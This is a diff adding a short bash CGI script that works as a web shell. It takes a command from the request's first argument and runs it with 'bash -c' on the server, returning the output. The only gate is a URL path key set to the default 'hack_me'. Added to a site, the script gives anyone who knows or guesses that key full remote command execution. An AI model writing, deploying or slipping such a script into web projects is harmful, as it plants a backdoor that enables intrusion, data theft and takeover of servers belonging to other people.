@@ -1,0 +1,63 @@
+#!/usr/bin/env bash
+
+echo "Content-Type: text/plain;charset=utf-8"
+echo 
+
+# BEGIN CONFIGURATION
+
+key="hack_me"
+strip_slashes=1
+
+# END CONFIGURATION
+
+quote () 
+{
+    echo \'${1//\'/\'\\\'\'}\'
+}
+
+strip_slashes () 
+{
+    param="$1"
+    param="${param//&/&0}"
+    param="${param//\\\\/&1}"
+    param="${param//\\/}"
+    param="${param//&1/\\}"
+    param="${param//&0/&}"
+    
+    echo "$param"
+}
+
+if [ "$key" = "" ] || [ "$PATH_INFO" != "/key/$key" ]
+then
+    echo "*** Invalid Key ***"
+    
+    exit
+fi
+
+if [ "$#" != "0" ] && [ "$#" != "1" ]
+then
+    echo "*** Invalid Arguments ***"
+    
+    exit
+fi
+
+if [ "$strip_slashes" != "" ] && [ "$strip_slashes" != "0" ]
+then
+    cmd="$(strip_slashes "$1")"
+else
+    cmd="$1"
+fi
+
+if [ "$cmd" != "" ]
+then
+    cd
+    
+    echo "*** begin ***: $(quote "$cmd")"
+    bash -c "$cmd" 2>&1
+    echo "*** end ***"
+else
+    echo "*** nothing to do ***"
+fi
+
+true
+
